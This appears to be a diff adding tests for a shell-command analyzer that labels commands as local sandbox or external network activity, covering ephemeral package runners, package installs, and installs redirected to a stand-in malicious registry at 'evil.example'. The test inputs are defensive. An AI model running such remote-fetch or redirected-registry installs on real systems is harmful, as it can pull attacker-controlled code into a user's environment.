@@ -72,4 +72,44 @@ describe('analyzeShellCommand', () => {
     const r = analyzeShellCommand(`python3 -c 'import urllib'`, root)
     assert.equal(r.verdict, 'external')
   })
+
+  it('keeps local test/build commands as sandbox', () => {
+    assert.equal(analyzeShellCommand('npm test -- --coverage', root).verdict, 'sandbox')
+    assert.equal(analyzeShellCommand('npm run build', root).verdict, 'sandbox')
+  })
+
+  it('flags ephemeral package runners (npx/dlx/bunx/uvx/pipx)', () => {
+    for (const cmd of [
+      'npx some-cli@latest',
+      'pnpm dlx create-thing',
+      'yarn dlx create-thing',
+      'bunx cowsay hi',
+      'uvx ruff check',
+      'pipx run black .',
+    ]) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'external', `expected external for: ${cmd}`)
+      assert.ok(
+        r.reasons.some((x) => /ephemeral package runner/.test(x)),
+        `missing runner reason for: ${cmd}`,
+      )
+    }
+  })
+
+  it('flags bun/corepack/go/uv package operations', () => {
+    assert.equal(analyzeShellCommand('bun install', root).verdict, 'external')
+    assert.equal(analyzeShellCommand('corepack enable', root).verdict, 'external')
+    assert.equal(analyzeShellCommand('go install example.com/cmd@latest', root).verdict, 'external')
+    assert.equal(analyzeShellCommand('uv pip install requests', root).verdict, 'external')
+  })
+
+  it('flags custom registry / index redirects on installs', () => {
+    const npmr = analyzeShellCommand('npm install foo --registry https://evil.example', root)
+    assert.equal(npmr.verdict, 'external')
+    assert.ok(npmr.reasons.some((x) => /custom package registry/.test(x)))
+
+    const pipr = analyzeShellCommand('pip install foo --index-url https://evil.example', root)
+    assert.equal(pipr.verdict, 'external')
+    assert.ok(pipr.reasons.some((x) => /custom pip index/.test(x)))
+  })
 })
